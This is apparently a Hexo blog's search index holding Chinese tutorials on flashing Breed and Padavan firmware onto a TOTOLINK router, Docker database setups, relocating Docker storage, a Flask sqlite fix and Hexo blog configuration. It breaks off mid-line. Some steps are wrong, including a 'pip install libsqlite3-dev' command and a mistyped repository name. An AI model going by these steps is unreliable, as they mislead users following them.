<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>TOTOLINK A3004NS 国行刷入 Breed 不死和 hiboy Padavan 固件</title>
    <url>/2019/09/17/A3004NS/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>蜗牛星际装了黑群晖后，加上家里的宽带是 200M 带宽，以前的 Newifi mini 百兆路由器已经不能满足需求了，于是闲鱼入手了 TOTOLINK A3004NS 千兆路由器。</p>
<span id="more"></span>

<h2 id="安装-breed"><a href="#安装-breed" class="headerlink" title="安装 breed"></a>安装 breed</h2><p><strong>1</strong>. <strong>进路由记录下LAN, WAN, 2.G, 5G 的 MAC 地址备用</strong>(Ps: 最好记录一下，后面可能会出现刷机后 Mac 地址改变，需要用来复原)</p>
<p><strong>2</strong>.原厂固件下刷入荒野无灯大神 <a href="https://github.com/Wooden-Robot/documents-for-fun/raw/master/A3004NS/STOCK_ROM_UPGRADE_A3004NS_3.4.3.9-099_20170307-0247.trx">A3004NS Padavan 直刷固件</a><br><img src="/images/a3004ns1.jpg" alt="a3004ns.jpg"><br>路由器地址为：<a href="192.168.88.1">192.168.88.1</a><br>登录账号密码为：<code>admin/admin</code></p>
<p><strong>3</strong>.查看固件分区</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[A3004NS /opt/home/admin]# cat /proc/mtd</span><br><span class="line">dev:    size   erasesize  name</span><br><span class="line">mtd0: 00020000 00010000 &quot;Bootloader&quot;</span><br><span class="line">mtd1: 00010000 00010000 &quot;Config&quot;</span><br><span class="line">mtd2: 00010000 00010000 &quot;Factory&quot;</span><br><span class="line">mtd3: 00143250 00010000 &quot;Kernel&quot;</span><br><span class="line">mtd4: 00d7cdb0 00010000 &quot;RootFS&quot;</span><br><span class="line">mtd5: 00100000 00010000 &quot;Storage&quot;</span><br><span class="line">mtd6: 00ec0000 00010000 &quot;Firmware_Stub</span><br></pre></td></tr></table></figure>

<p><strong>4</strong>.重启，备份EEPROM<br>ssh 登录路由器，使用以下命令进行备份：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ dd if=/dev/mtd2 of=/tmp/Factory.bin</span><br></pre></td></tr></table></figure>
<p><code>Factory</code> 就是 EEPROM。<br>此时可以将其他分区用同样的方法都备份一下，以备不时之需。备份好需要从路由器中将备份数据下载到本地，可以用 <code>ftp、scp</code>等命令行命令，也可以使用 <code>FileZilla</code> 工具。<br>这是我用 <code>dd</code> 命令备份的所有分区信息：<a href="https://github.com/Wooden-Robot/documents-for-fun/tree/master/A3004NS/dd%E5%A4%87%E4%BB%BD">dd 全分区备份</a>。</p>
<p><strong>5</strong>.下载最新版的 <a href="https://breed.hackpascal.net/breed-mt7621-totolink-a3004ns.bin">A3004NS breed 固件</a>并上传到路由器的 <code>/tmp</code> 路径下。</p>
<p><strong>6</strong>.通过 ssh 登录路由器执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mtd_write write /tmp/breed-mt7621-totolink-a3004ns.bin Bootloader</span><br></pre></td></tr></table></figure>

<p><strong>7</strong>.完了将路由器断电。然后按住前面板上的 <code>WPS</code> 按钮通电，多按一会儿。这时路由器网关又变成了 <a href="192.168.1.1">192.168.1.1</a>。使用浏览器打开这个地址就可以进入 breed 后台。<br><img src="/images/a3004ns2.png" alt="ba4544cd.png"></p>
<p><strong>8</strong>.进入 <code>Breed</code> 后，记得先备份 <code>EEPROM</code>。这个很重要，后面如果刷固件刷出问题需要这个来还原。<br><img src="/images/a3004ns3.png" alt="6f11b6b4.png"></p>
<h2 id="安装-hiboy-Padavan"><a href="#安装-hiboy-Padavan" class="headerlink" title="安装 hiboy Padavan"></a>安装 hiboy Padavan</h2><p><strong>1</strong>.下载 hiboy Padavan 最新版固件：<a href="http://opt.cn2qq.com/padavan/">http://opt.cn2qq.com/padavan/</a></p>
<p><strong>2</strong>.进入 Breed，点击“固件更新”-〉“常规固件”：</p>
<ul>
<li>勾选<code>固件</code>，并选择我们下载的固件。</li>
<li>勾选<code>EEPROM</code>，并选择刚刚用 <code>Breed</code> 备份的 <code>EEPROM</code></li>
<li>闪存布局选择：<code>公版(0x50000)</code></li>
<li>点击<code>上传</code>按钮进行安装。<br><img src="/images/a3004ns4.png" alt="1eb92b85.png"><br>路由器地址为：<a href="192.168.123.1">192.168.123.1</a><br>登录账号密码为：<code>admin/admin</code></li>
</ul>
<p><strong>3</strong>.如果MAC地址改变，<a href="https://www.right.com.cn/forum/thread-321228-1-1.html">进入 Breed 把记下来的 MAC 地址填进去并保存</a>。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://right.com.cn/forum/forum.php?mod=viewthread&tid=321428&page=1">国行A3004NS-Dual刷机实战（附编程器固件）</a></li>
<li><a href="http://hangge.com/blog/cache/detail_1857.html">Padavan老毛子固件刷机教程（TOTOLINK A3004NS 路由器）</a></li>
<li><a href="https://www.right.com.cn/forum/thread-321228-1-1.html">极路由4(B70)刷Padavan固件后在breed里修复MAC的方法</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Padavan</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker compose 安装 PostgreSQL 和 MySQL</title>
    <url>/2018/10/16/Docker-compose-%E5%AE%89%E8%A3%85-PostgreSQL-%E5%92%8C-MySQL/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下 Docker compose 安装 PostgreSQL 和 MySQL。</p>
<span id="more"></span>
<h1 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h1><h2 id="docker-compose-配置"><a href="#docker-compose-配置" class="headerlink" title="docker-compose 配置"></a>docker-compose 配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &quot;3&quot;</span><br><span class="line"></span><br><span class="line">postgres:</span><br><span class="line">  image: postgres</span><br><span class="line">  container_name: local_postgresql</span><br><span class="line">  restart: always</span><br><span class="line">  environment:</span><br><span class="line">    POSTGRES_DB: db_name</span><br><span class="line">    POSTGRES_USER: postgres</span><br><span class="line">    POSTGRES_PASSWORD: password</span><br><span class="line">  ports:</span><br><span class="line">      - 4352:5432</span><br><span class="line">  volumes:</span><br><span class="line">    - /data/postgresql:/var/lib/postgresql/data</span><br></pre></td></tr></table></figure>
<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="docker-compose-配置-1"><a href="#docker-compose-配置-1" class="headerlink" title="docker-compose 配置"></a>docker-compose 配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;3&#x27;</span><br><span class="line">services:</span><br><span class="line">  mysql:</span><br><span class="line">    image: mysql</span><br><span class="line">    container_name: local_mysql</span><br><span class="line">    entrypoint: [&#x27;/entrypoint.sh&#x27;, &#x27;--default-authentication-plugin=mysql_native_password&#x27;]</span><br><span class="line">    restart: always</span><br><span class="line">    volumes:</span><br><span class="line">      - /data/mysql:/var/lib/mysql/</span><br><span class="line">    ports:</span><br><span class="line">      - 127.0.0.1:3306:3306</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_ROOT_PASSWORD=password</span><br></pre></td></tr></table></figure>
<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://blog.windrunner.me/sa/dockerize-postgres.html">https://blog.windrunner.me/sa/dockerize-postgres.html</a></li>
<li><a href="https://yeasy.gitbooks.io/docker_practice/install/ubuntu.html">https://yeasy.gitbooks.io/docker_practice/install/ubuntu.html</a></li>
<li><a href="https://docs.docker.com/v17.09/engine/installation/linux/docker-ce/ubuntu/#set-up-the-repository">https://docs.docker.com/v17.09/engine/installation/linux/docker-ce/ubuntu/#set-up-the-repository</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 占满 Linux 系统盘解决方案</title>
    <url>/2018/08/16/Docker-%E5%8D%A0%E6%BB%A1-Linux-%E7%B3%BB%E7%BB%9F%E7%9B%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一般情况下我们通过命令在 Linux 上安装 Docker，Docker 会将文件默认储存在 <code>/var/lib/docker</code> 目录下，时间久了就会占用很大空间，最后导致系统盘被占满。此时需要将文件转移到数据盘上并做一个软连接。</p>
<hr>
<span id="more"></span>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>1.首先进入 <code>root</code> 用户：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo su</span><br></pre></td></tr></table></figure>
<p>2.关闭 Docker 服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ service docker stop</span><br></pre></td></tr></table></figure>
<p>3.复制 <code>/var/lib/docker</code> 文件夹到系统盘：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cp -pr /var/lib/docker /mnt/data</span><br></pre></td></tr></table></figure>

<p><strong>注：此处 <code>/mnt/data</code> 为系统盘路径</strong></p>
<p>4.为了以防万一首先备份 <code>/var/lib/docker</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mv /var/lib/docker /var/lib/docker.bak</span><br></pre></td></tr></table></figure>
<p>5.建立软连接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ln -s /mnt/data/docker /var/lib/docker</span><br></pre></td></tr></table></figure>
<p>6.启动 Docker：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ service docker start</span><br></pre></td></tr></table></figure>
<p>7.启动 Docker 中的容器，根据容器 ID 或者名称启动容器:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker ps 查看正在运行的容器</span><br><span class="line">$ docker ps -a 查看所有容器</span><br><span class="line">$ docker start CONTAINER ID/NAMES</span><br></pre></td></tr></table></figure>
<p>8.检测容器中的程序是否正常运行，正常运行后可将 <code>/var/lib/docker.bak</code> 备份文件删除，解决系统盘被占满的问题。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask无法使用Flask-SQLALchemy扩展解决方案</title>
    <url>/2016/08/18/Flask%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8Flask-SQLALchemy%E6%89%A9%E5%B1%95%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习Flask的时候用到了Flask-SQLALchemy扩展，在使用过程可以正常导入Flask-SQLALchemy库，但是程序运行就出现缺少<code>_sqlite3</code>的错误。</p>
<span id="more"></span>
<h1 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h1><p>1.ubuntu 14.04<br>2.python 3.5</p>
<h1 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ImportError: No module named _sqlite3</span><br></pre></td></tr></table></figure>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>1.<code>ctrl+alt+t</code>打开终端输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pip install libsqlite3-dev</span><br></pre></td></tr></table></figure>
<p>2.安装完毕后进入<a href="https://www.python.org/getit/">python官网</a>下载python源文件进行重新编译。<br>3.解压下载好的python源文件，在该文件内打开终端依次输入下列代码进行编译：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>4.最后使用在<code>/usr/local/bin</code>文件夹里重新编译好的<code>pytho3.5</code>主程序即可解决问题。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Flask</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo搭建个人博客（一）— 前期准备</title>
    <url>/2016/02/27/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%20%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近几个月自学python的过程中，搜索爬虫资料的时候关注了<a href="http://xlzd.me/">xlzd</a>的博客，为我开启了一片新世界，之后慢慢收藏了各方高人的博客。搭建一个自己博客的萌芽也悄然种下，也许是命运使然，在逛知乎的时候偶然间看到<a href="https://www.zhihu.com/question/39183612">如何使用10个小时搭建出个人域名而又Geek的独立博客？</a>，得到了浇灌的萌芽开始茁壮生长。经过几天不懈的没日没夜的努力，解决了各种问题（ps：因为一个bug曾让我一度对自己感到绝望），终于把自己的博客搭建成功。接下来我就把我走过N多弯路后的经验传授给大家，让大家少走弯路轻松愉快地搭建自己的Hexo博客。</p>
<span id="more"></span>
<hr>
<h1 id="安装所需软件"><a href="#安装所需软件" class="headerlink" title="安装所需软件"></a>安装所需软件</h1><p>1.<a href="https://nodejs.org/en/">Node.js</a></p>
<p>2.<a href="http://git-scm.com/downloads">Git</a></p>
<h1 id="什么是Hexo？"><a href="#什么是Hexo？" class="headerlink" title="什么是Hexo？"></a>什么是Hexo？</h1><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo使用Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p>
<h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>在安装好Git和node.js后，打开cmd（命令提示符），输入以下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
<p>安装好后不要急着去用，我们先注册好github账号。</p>
<h1 id="github"><a href="#github" class="headerlink" title="github"></a>github</h1><h2 id="注册账号"><a href="#注册账号" class="headerlink" title="注册账号"></a>注册账号</h2><p>进入<a href="https://github.com/">github官网</a>，按照提示注册账号。</p>
<h2 id="创建repository"><a href="#创建repository" class="headerlink" title="创建repository"></a>创建repository</h2><p>按照下图所示点击New repository<br><img src="/images/QQ%E6%88%AA%E5%9B%BE20160227224241.png"><br>按图中所示操作，其中第一步中填入username.github.io（username是你的账号名，username不区分大小写）。如我的username为Wooden-Robot，我应该填入Wooden-robot.io。<br><img src="/images/QQ%E6%88%AA%E5%9B%BE20160227225028.png"><br>到这里各项准备工作已经做好，接下来就要进入Hexo的搭建。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo搭建个人博客（三）—— Hexo博客的美化</title>
    <url>/2016/03/01/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%20Hexo%E7%BE%8E%E5%8C%96/</url>
    <content><![CDATA[<p>通过前两节的学习，我们已经搭建好自己的博客，就像盖房子一样要对内部进行装修，也就是对博客进行美化。</p>
<span id="more"></span>
<hr>
<h1 id="安装Hexo博客主题"><a href="#安装Hexo博客主题" class="headerlink" title="安装Hexo博客主题"></a>安装Hexo博客主题</h1><p>Hexo博客可以安装不同的主题，这里我们只说最火的Next主题。首先我们在自己电脑里的博客文件夹内（即username.github.io文件夹内）右键选择<code>Git Bash here</code>，在终端窗口内输入以下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/iissnan/hexo-theme-<span class="built_in">next</span> themes/<span class="built_in">next</span></span><br></pre></td></tr></table></figure>
<p>稍等片刻，安装完成后你的<code>themes</code>文件夹内就会多出一个<code>next</code>文件夹，请在站点的配置文件中把主题选为next，即<code>theme: next</code>。</p>
<h1 id="博客的配置"><a href="#博客的配置" class="headerlink" title="博客的配置"></a>博客的配置</h1><p>接下来我们对博客的配置主要将在两个<code>_config.yml</code>文件中进行。第一个为Hexo博客的站点配置文件位于你的博客文件夹（即username.github.io文件夹）内；第二个位于next文件夹内。<br>首先让我们看看站点配置文件都有什么：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hexo Configuration</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/configuration.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/hexojs/hexo/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site</span></span><br><span class="line">title: why so serious?  <span class="comment"># 站点名</span></span><br><span class="line">subtitle:  <span class="comment"># 副标题</span></span><br><span class="line">description:</span><br><span class="line">author: WoodenRobot  <span class="comment"># 作者</span></span><br><span class="line">language: zh-Hans <span class="comment"># 语言，zh-Hans为中文简体</span></span><br><span class="line">timezone:</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span></span><br><span class="line">url: http://woodenrobot.me <span class="comment"># 博客网址</span></span><br><span class="line">root: /</span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">permalink_defaults:</span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory</span></span><br><span class="line">source_dir: source</span><br><span class="line">public_dir: public</span><br><span class="line">tag_dir: tags</span><br><span class="line">archive_dir: archives</span><br><span class="line">category_dir: categories</span><br><span class="line">code_dir: downloads/code</span><br><span class="line">i18n_dir: :lang</span><br><span class="line">skip_render:</span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing</span></span><br><span class="line">new_post_name: :title.md <span class="comment"># File name of new posts</span></span><br><span class="line">default_layout: post</span><br><span class="line">titlecase: false <span class="comment"># Transform title into titlecase</span></span><br><span class="line">external_link: true <span class="comment"># Open external links in new tab</span></span><br><span class="line">filename_case: <span class="number">0</span></span><br><span class="line">render_drafts: false</span><br><span class="line">post_asset_folder: false</span><br><span class="line">relative_link: false</span><br><span class="line">future: true</span><br><span class="line">highlight:</span><br><span class="line">  enable: true</span><br><span class="line">  line_number: true</span><br><span class="line">  auto_detect: false</span><br><span class="line">  tab_replace:</span><br><span class="line"></span><br><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line">default_category: uncategorized</span><br><span class="line">category_map:</span><br><span class="line">tag_map:</span><br><span class="line"></span><br><span class="line"><span class="comment"># Date / Time format</span></span><br><span class="line"><span class="comment">## Hexo uses Moment.js to parse and display date</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line">date_format: YYYY-MM-DD</span><br><span class="line">time_format: HH:mm:ss</span><br><span class="line"></span><br><span class="line"><span class="comment"># Pagination</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line">per_page: <span class="number">10</span></span><br><span class="line">pagination_dir: page</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions  # 这里配置站点所用主题和插件</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line">theme: <span class="built_in">next</span>  <span class="comment">#请添加next主题并选择</span></span><br><span class="line"><span class="comment">#theme: landscape</span></span><br><span class="line"><span class="comment">#theme: yilia</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多说</span></span><br><span class="line">duoshuo_shortname: woodenrobot  <span class="comment"># xxx.duoshuo.com，xxx即是shortname</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 百度  # 需要安装插件 npm install hexo-generator-baidu-sitemap@0.1.1 --save</span></span><br><span class="line">baidusitemap:</span><br><span class="line">  path: baidusitemap.xml</span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository: https://github.com/Wooden-Robot/Wooden-Robot.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line">  plugins: -hexo-generator-feed</span><br></pre></td></tr></table></figure>
<p>大家可以根据自己的情况进行设置。<br>接下来是主题的配置文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Site Information Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Place your favicon.ico to /source directory.</span></span><br><span class="line">favicon: /favicon.ico</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set default keywords (Use a comma to separate)</span></span><br><span class="line">keywords: <span class="string">&quot;woodenrobot&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set rss to false to disable feed link.</span></span><br><span class="line"><span class="comment"># Leave rss as empty to use site&#x27;s feed link.</span></span><br><span class="line"><span class="comment"># Set rss to specific value if you have burned your feed already.</span></span><br><span class="line">rss: /atom.xml <span class="comment">#此处需要安装插件npm install hexo-generator-feed --save</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify the date when the site was setup</span></span><br><span class="line">since: <span class="number">2016</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Menu Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># When running hexo in a subdirectory (e.g. domain.tld/blog)</span></span><br><span class="line"><span class="comment"># Remove leading slashes ( &quot;/archives&quot; -&gt; &quot;archives&quot; )</span></span><br><span class="line">menu:</span><br><span class="line">  home: /                   <span class="comment">#主页</span></span><br><span class="line">  categories: /categories   <span class="comment">#分类页（需手动创建） 教程请往下看！</span></span><br><span class="line">  about: /about             <span class="comment">#关于页面（需手动创建）</span></span><br><span class="line">  archives: /archives       <span class="comment">#归档页</span></span><br><span class="line">  tags: /tags               <span class="comment">#标签页（需手动创建）</span></span><br><span class="line">  <span class="comment">#commonweal: /404.html    #公益 404 （需手动创建）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable/Disable menu icons.</span></span><br><span class="line"><span class="comment"># Icon Mapping:</span></span><br><span class="line"><span class="comment">#   Map a menu item to a specific FontAwesome icon name.</span></span><br><span class="line"><span class="comment">#   Key is the name of menu item and value is the name of FontAwsome icon.</span></span><br><span class="line"><span class="comment">#   When an question mask icon presenting up means that the item has no mapping icon.</span></span><br><span class="line">menu_icons:</span><br><span class="line">  enable: true</span><br><span class="line">  <span class="comment"># Icon Mapping.</span></span><br><span class="line">  home: home</span><br><span class="line">  about: user</span><br><span class="line">  categories: th</span><br><span class="line">  tags: tags</span><br><span class="line">  archives: archive</span><br><span class="line">  commonweal: heartbeat</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Scheme Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Schemes #此为主题内主题，建议选择Mist。个人感觉比较稳定Bug少，改用其他主题可能会出现未知Bug（取决于作者是否在最新版内完善）。</span></span><br><span class="line"><span class="comment">#scheme: Muse</span></span><br><span class="line">scheme: Mist</span><br><span class="line"><span class="comment">#scheme: Pisces</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Sidebar Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#links_title #以下是侧边栏的友情链接，你们的配置文件中可能没有，按我的样式添加即可。</span></span><br><span class="line">links_title: 友情链接</span><br><span class="line"></span><br><span class="line">links:</span><br><span class="line">  瓢虫映像: http://site.douban.com/<span class="number">177837</span>/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Social links</span></span><br><span class="line">social:</span><br><span class="line">  weibo: http://weibo.com/u/<span class="number">1561651905</span></span><br><span class="line">  GitHub: https://github.com/Wooden-Robot</span><br><span class="line">  zhihu: https://www.zhihu.com/people/mu-zhi-robot</span><br><span class="line"></span><br><span class="line"><span class="comment"># Social Icons</span></span><br><span class="line">social_icons:</span><br><span class="line">  enable: true</span><br><span class="line">  <span class="comment"># Icon Mappings</span></span><br><span class="line">  GitHub: github</span><br><span class="line">  Twitter: twitter</span><br><span class="line">  Weibo: weibo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="comment"># in theme directory(source/images): /images/avatar.jpg</span></span><br><span class="line"><span class="comment"># in site  directory(source/uploads): /uploads/avatar.jpg</span></span><br><span class="line"><span class="comment"># default : /images/default_avatar.jpg</span></span><br><span class="line">avatar: /uploads/avatar.jpg  <span class="comment"># 此处为侧边栏里的头像可以放入图片链接，也可将图片放入站点文件的source/uploads中（没有请在source中新建uploads）或者放入theme文件的source/images中。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># TOC in the Sidebar</span></span><br><span class="line">toc:</span><br><span class="line">  enable: true</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Automatically add list number to toc.</span></span><br><span class="line">  number: true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creative Commons 4.0 International License.</span></span><br><span class="line"><span class="comment"># http://creativecommons.org/</span></span><br><span class="line"><span class="comment"># Available: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero</span></span><br><span class="line"><span class="comment">#creative_commons: by-nc-sa</span></span><br><span class="line"><span class="comment">#creative_commons:</span></span><br><span class="line"></span><br><span class="line">sidebar:  <span class="comment"># 此处应为侧边栏左右位置，但并无什么作用，乱选无用或有bug。</span></span><br><span class="line">  <span class="comment"># Sidebar Position, available value: left | right</span></span><br><span class="line">  position: left</span><br><span class="line">  <span class="comment">#position: right</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Sidebar Display, available value:</span></span><br><span class="line">  <span class="comment">#  - post    expand on posts automatically. Default.</span></span><br><span class="line">  <span class="comment">#  - always  expand for all pages automatically</span></span><br><span class="line">  <span class="comment">#  - hide    expand only when click on the sidebar toggle icon.</span></span><br><span class="line">  <span class="comment">#  - remove  Totally remove sidebar including sidebar toggle icon.</span></span><br><span class="line">  <span class="comment">#display: post</span></span><br><span class="line">  display: always</span><br><span class="line">  <span class="comment">#display: hide</span></span><br><span class="line">  <span class="comment">#display: remove</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Misc Theme Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom Logo.</span></span><br><span class="line"><span class="comment"># !!Only available for Default Scheme currently.</span></span><br><span class="line"><span class="comment"># Options:</span></span><br><span class="line"><span class="comment">#   enabled: [true/false] - Replace with specific image</span></span><br><span class="line"><span class="comment">#   image: url-of-image   - Images&#x27;s url</span></span><br><span class="line">custom_logo:</span><br><span class="line">  enabled: false</span><br><span class="line">  image:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Code Highlight theme</span></span><br><span class="line"><span class="comment"># Available value:</span></span><br><span class="line"><span class="comment">#    normal | night | night eighties | night blue | night bright</span></span><br><span class="line"><span class="comment"># https://github.com/chriskempson/tomorrow-theme</span></span><br><span class="line">highlight_theme: normal</span><br><span class="line"></span><br><span class="line"><span class="comment"># Automatically scroll page to section which is under &lt;!-- more --&gt; mark.</span></span><br><span class="line">scroll_to_more: true</span><br><span class="line"></span><br><span class="line"><span class="comment"># Automatically Excerpt</span></span><br><span class="line">auto_excerpt:</span><br><span class="line">  enable: true</span><br><span class="line">  length: <span class="number">150</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use Lato font</span></span><br><span class="line">use_font_lato: true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Third Party Services Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MathJax Support</span></span><br><span class="line">mathjax:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Swiftype Search API Key  # 站内搜素，教程请看往下看！</span></span><br><span class="line">swiftype_key: TChYnQxfabLwWxErgM-L</span><br><span class="line"></span><br><span class="line"><span class="comment"># Baidu Analytics ID</span></span><br><span class="line"><span class="comment">#baidu_analytics:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Duoshuo ShortName  # 多说评论，教程请看往下看！</span></span><br><span class="line">duoshuo_shortname: woodenrobot</span><br><span class="line">duoshuo_hotartical: true</span><br><span 